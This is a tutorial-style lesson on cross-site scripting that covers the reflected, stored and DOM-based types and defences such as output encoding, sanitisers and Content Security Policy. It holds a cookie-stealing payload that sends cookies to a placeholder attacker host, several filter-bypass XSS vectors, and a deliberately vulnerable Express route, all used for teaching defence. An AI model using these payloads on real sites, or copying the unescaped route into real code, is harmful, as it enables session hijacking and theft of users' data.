# Cross-Site Scripting (XSS) Attacks

> Trust the origin, not the content — any page that echoes untrusted input is a liability.

**Type:** Learn
**Prerequisites:** HTTP Fundamentals, Browser Security Model (Same-Origin Policy), SQL Injection
**Time:** ~25 minutes

## The Problem

You build a comment section for your blog. Users type comments, they get saved to the database,
and the page renders them for every visitor. That feature is also a loaded gun. If you display
the raw comment text inside HTML without escaping it, any visitor can submit
`<script>document.location='https://attacker.com/steal?c='+document.cookie</script>` as a
comment. The next 50,000 people who read your blog silently send their session cookies to an
attacker's server — they never clicked anything suspicious.

XSS (Cross-Site Scripting) is a class of injection attack where an adversary causes a victim's
browser to execute JavaScript that the victim never intended to run. Unlike server-side attacks,
the server is usually fine; it is the victim's browser that becomes the execution environment.
This means HTTPS, firewalls, and rate limiters offer zero protection — the attack travels inside
legitimate page content.

The damage radius is wide: session hijacking, credential theft, keylogging, page defacement,
silently posting on a user's behalf, or using the victim's browser as a pivot point to attack
internal network services. Because the script runs with the full privileges of the target origin,
XSS often bypasses every other access control the application has in place.

## The Concept

XSS attacks split into three distinct families based on where the payload lives and how it reaches
the browser.

### Attack Taxonomy

| Type | Where payload is stored | Requires victim to click a link? | Persists across page loads? |
|---|---|---|---|
| Reflected | URL / request parameter | Yes | No |
| Stored (Persistent) | Server database or file | No | Yes |
| DOM-based | Client-side JavaScript | Sometimes | No |

### Reflected XSS

The payload is embedded in the URL or a form parameter. The server reads the value, echoes it
into the HTML response without sanitisation, and the browser executes it. The attacker crafts a
malicious URL and distributes it (email, forum post, QR code). Only users who follow the link
are affected; nothing is saved server-side.

```
Attacker crafts URL
  └── https://shop.example.com/search?q=<script>stealCookies()</script>

Victim clicks link
  └── Browser sends GET /search?q=<script>...</script>

Server responds (insecure)
  └── <p>Results for: <script>stealCookies()</script></p>

Browser renders response
  └── Executes stealCookies() in context of shop.example.com
      └── Cookie: session=abc123  →  attacker's server
```

### Stored XSS

The payload is written to persistent storage (a database, a log, a profile field) and is later
served to every user who views the affected page. No individual link is needed; anyone who loads
the page triggers the script. Stored XSS is the most dangerous variant because one successful
injection can silently compromise thousands of users.

```
POST /comments  body: { text: "<script>stealCookies()</script>" }
                        │
                   DB: comments table
                        │
                   GET /post/42  (any victim, any time)
                        │
              <div class="comment">
                <script>stealCookies()</script>   ← executes
              </div>
```

### DOM-Based XSS

The payload never touches the server. Client-side JavaScript reads from an attacker-controlled
source (e.g., `location.hash`, `document.referrer`, `postMessage`) and writes it into the DOM
using a dangerous sink (`innerHTML`, `document.write`, `eval`). Traditional server-side input
validation is blind to this attack.

```
Attacker URL:
  https://app.example.com/dashboard#<img src=x onerror=stealCookies()>

Client-side JS (insecure):
  const tag = location.hash.slice(1);
  document.getElementById('welcome').innerHTML = tag;  // sink: innerHTML

Browser: parses the injected <img>, fires onerror, executes stealCookies()
```

### The Source → Sink Model

Every XSS attack follows the same flow:

```
Attacker-controlled SOURCE
  (URL param, form field, cookie, postMessage, localStorage, ...)
          │
          │  travels through application logic
          ▼
Dangerous SINK
  (innerHTML, document.write, eval, setTimeout(string),
   href assignment, window.location assignment, ...)
          │
          ▼
  Browser executes JavaScript in victim's origin context
```

Preventing XSS means breaking this chain — either by sanitising or rejecting at the source,
or by making every sink safe.

### Payloads Beyond `<script>` Tags

Filters that only strip `<script>` are trivially bypassed:

```html
<!-- event handler -->
<img src="x" onerror="stealCookies()">

<!-- anchor href with javascript: scheme -->
<a href="javascript:stealCookies()">Click me</a>

<!-- SVG with embedded script -->
<svg onload="stealCookies()">

<!-- HTML entity obfuscation (some parsers decode before executing) -->
<img src=x onerror=&#115;&#116;&#101;&#97;&#108;&#67;&#111;&#111;&#107;&#105;&#101;&#115;()>
```

A robust defence must handle the full HTML parsing spec, not a regex blocklist.

## Build It / In Depth

### Step 1 — Vulnerable Server (Node / Express)

```javascript
// INSECURE — never do this
app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(`<html><body><p>Results for: ${query}</p></body></html>`);
});
```

A request to `/search?q=<script>alert(1)</script>` causes an alert in the victim's browser.

### Step 2 — Fix with Output Encoding

Output encoding is the primary defence. Every character that has special meaning in HTML must
be replaced with its HTML entity equivalent before being inserted into the page.

```javascript
const he = require('he'); // html-entities library

app.get('/search', (req, res) => {
  const query = he.encode(req.query.q ?? '');
  res.send(`<html><body><p>Results for: ${query}</p></body></html>`);
});
```

The encoding converts `<script>` → `&lt;script&gt;`, which the browser renders as text, not markup.
The rule is: **encode for the context you're placing data into**.

| Placement context | Encoding required | Example |
|---|---|---|
| HTML body / attribute | HTML entity encoding | `<` → `&lt;` |
| JavaScript string | JavaScript Unicode escaping | `'` → `'` |
| CSS value | CSS hex escaping | `(` → `\28` |
| URL parameter | Percent encoding | `<` → `%3C` |

### Step 3 — Stored XSS Prevention

On writes, validate and strip; on reads, encode. Never rely on sanitisation alone at write time —
stored data is read in multiple contexts (HTML, JSON APIs, email templates) and each needs its
own encoding pass.

```python
import bleach  # Python library for safe HTML subset
from markupsafe import Markup, escape  # Jinja2 companion

ALLOWED_TAGS = ['b', 'i', 'em', 'strong', 'a']
ALLOWED_ATTRS = {'a': ['href', 'title']}

def sanitize_comment(raw: str) -> str:
    # Allow a limited, safe HTML subset; strip everything else
    return bleach.clean(raw, tags=ALLOWED_TAGS, attributes=ALLOWED_ATTRS, strip=True)

# On display in a template, Jinja2 auto-escapes by default:
# {{ comment }}  →  safe
# {{ comment | safe }}  →  dangerous, only use when sanitization is guaranteed
```

### Step 4 — DOM XSS Prevention

Replace dangerous sinks with safe equivalents:

```javascript
// DANGEROUS: innerHTML parses HTML, executes event handlers
element.innerHTML = userInput;

// SAFE: textContent treats content as text, never as markup
element.textContent = userInput;

// DANGEROUS: document.write with user data
document.write('<p>' + userInput + '</p>');

// SAFE: create elements programmatically
const p = document.createElement('p');
p.textContent = userInput;
document.body.appendChild(p);

// DANGEROUS: href with unvalidated input
link.href = userInput; // could be "javascript:stealCookies()"

// SAFE: validate the scheme before assigning
function safeHref(url) {
  const parsed = new URL(url, location.origin);
  if (!['http:', 'https:'].includes(parsed.protocol)) {
    throw new Error('Invalid URL scheme');
  }
  return parsed.href;
}
link.href = safeHref(userInput);
```

### Step 5 — Content Security Policy (CSP)

CSP is a browser-enforced allowlist that restricts what scripts, styles, and resources a page
may load. It provides defence-in-depth against XSS by preventing execution even if injection
occurs.

```
# Strict CSP using nonces (preferred over hash-based for dynamic pages)
Content-Security-Policy:
  default-src 'self';
  script-src 'nonce-{RANDOM_PER_REQUEST}' 'strict-dynamic';
  object-src 'none';
  base-uri 'self';
```

Each server-side rendered `<script>` tag must carry the matching nonce attribute. Injected
scripts from an attacker have no nonce and the browser refuses to execute them.

```html
<!-- Server sets header with nonce: abc123 -->
<script nonce="abc123">
  // This executes — nonce matches
  initApp();
</script>

<!-- Attacker's injected script has no nonce -->
<script>stealCookies()</script>  <!-- Blocked by CSP -->
```

## Use It

### Framework-Level Protections

Most modern frameworks auto-escape by default — the danger arises when developers opt out.

| Technology | Safe default | Dangerous escape hatch to avoid |
|---|---|---|
| React | `{variable}` JSX escapes automatically | `dangerouslySetInnerHTML` |
| Angular | `{{ variable }}` escapes automatically | `[innerHTML]`, `bypassSecurityTrustHtml()` |
| Vue | `{{ variable }}` escapes automatically | `v-html` |
| Jinja2 / Django | Auto-escape enabled by default | `{% autoescape off %}`, `\| safe` filter |
| Go `html/template` | Auto-escapes by context | `template.HTML()` type assertion |
| Handlebars | `{{variable}}` escapes | `{{{variable}}}` triple-stache |

### Web Application Firewalls (WAFs)

WAFs (AWS WAF, Cloudflare, ModSecurity) can detect and block common XSS payloads in HTTP
requests. They are useful as a secondary control but must not be treated as the primary defence
— they are bypassable, particularly for DOM-based XSS and obfuscated payloads. Always fix the
root cause in application code.

### Scanning and Testing

| Tool | Type | What it finds |
|---|---|---|
| OWASP ZAP | DAST | Reflected and stored XSS in running apps |
| Burp Suite Pro | DAST | XSS, including DOM variants via browser integration |
| Semgrep | SAST | Dangerous sinks in source code |
| DOMPurify | Runtime sanitiser | Safe HTML subset for client-side rendering |
| Trusted Types API | Browser API | Enforces safe sink usage at the browser level |

## Common Pitfalls

- **Sanitising at write time but not at read time.** Data stored in the database is read in
  many contexts — HTML pages, JSON APIs, PDF exports, notification emails. Sanitise or encode
  at every output point, not just on input.

- **Using blocklists instead of allowlists.** Stripping `<script>` tags while leaving `onerror`
  attributes, `javascript:` hrefs, or SVG payloads intact is a false sense of security. Use a
  vetted library (DOMPurify, bleach) that parses HTML to spec and allows only known-safe elements.

- **Marking content `| safe` or `dangerouslySetInnerHTML` without prior sanitisation.** Every
  usage of these escape hatches should be treated as a security review item. If you must render
  rich HTML, run it through a sanitiser (DOMPurify) before passing it to the unsafe API.

- **Ignoring DOM-based XSS in SPAs.** Single-page apps frequently pass data through URL
  fragments (`#`), `postMessage`, and `localStorage` — none of which are sent to the server.
  Server-side scanning misses these entirely. Audit every `innerHTML`, `eval`, and `document.write`
  call in client-side code.

- **Deploying a weak or absent CSP.** A CSP with `'unsafe-inline'` in `script-src` provides
  no XSS protection. Use nonce- or hash-based CSP in report-only mode first to detect violations,
  then enforce it. Never ship `script-src 'unsafe-inline' 'unsafe-eval'` in production.

## Exercises

1. **Easy** — Take the following Express route and identify every XSS vulnerability.
   Then rewrite it so it is safe without changing its visible output:
   ```javascript
   app.get('/greet', (req, res) => {
     res.send('<h1>Hello, ' + req.query.name + '!</h1>');
   });
   ```

2. **Medium** — You inherit a comment system that stores raw HTML in PostgreSQL and renders
   it with `v-html` in a Vue component. Design a migration plan that (a) sanitises existing
   stored data, (b) sanitises new input on write, and (c) removes the need for `v-html` by
   rendering a safe HTML subset. Describe the trade-offs of sanitising at write vs. read time.

3. **Hard** — Implement a strict CSP for a Next.js application that uses inline styles,
   a third-party analytics script, and server-side rendering. The CSP must achieve an A grade
   on [csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com). Document every
   directive decision and explain why `'unsafe-inline'` and `'unsafe-eval'` are excluded.
   Then add a `/csp-report` endpoint to collect violations and write a short script that
   aggregates the reports to find the top 5 blocked sources in a 24-hour window.

## Key Terms

| Term | What people think | What it actually means |
|---|---|---|
| XSS | Only about `<script>` tags | Any mechanism that causes the browser to execute attacker-controlled JavaScript in the victim's origin context, including event handlers, `javascript:` URLs, and SVG |
| Output encoding | Stripping dangerous characters | Transforming characters so they are interpreted as data, not markup — the specific transformation depends on the rendering context (HTML, JS, CSS, URL) |
| Reflected XSS | Requires server vulnerability | Requires the server to echo untrusted input back into the response, but the payload originates in the URL so the server itself is not "compromised" |
| Stored XSS | Only affects comment fields | Any server-persisted data rendered in HTML — profile names, order notes, file names, webhook URLs, log viewers |
| DOM-based XSS | Handled by server-side validation | Entirely client-side; the server never sees the payload, making server-side defences useless against it |
| CSP | Prevents all XSS | Reduces the impact of XSS but does not prevent injection; a misconfigured CSP (e.g., with `'unsafe-inline'`) provides no protection at all |
| Sanitisation | The same as encoding | Parsing markup and removing or rewriting unsafe elements/attributes; distinct from encoding, which escapes characters without interpreting them as HTML |

## Further Reading

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) — Canonical, context-aware defence guidance with code examples for multiple languages.
- [Google's strict-dynamic CSP guide](https://web.dev/strict-csp/) — Practical walkthrough for deploying a nonce-based CSP that works with bundlers and third-party scripts.
- [PortSwigger Web Security Academy — XSS](https://portswigger.net/web-security/cross-site-scripting) — Free, hands-on labs covering all three XSS types with an in-browser exploit environment.
- [Trusted Types specification (W3C)](https://w3c.github.io/trusted-types/dist/spec/) — Browser-level API that forces code to pass values through sanitiser factories before assigning to dangerous sinks.
- [DOMPurify GitHub repository](https://github.com/cure53/DOMPurify) — The de facto standard client-side HTML sanitiser; the README explains its threat model and safe usage patterns.
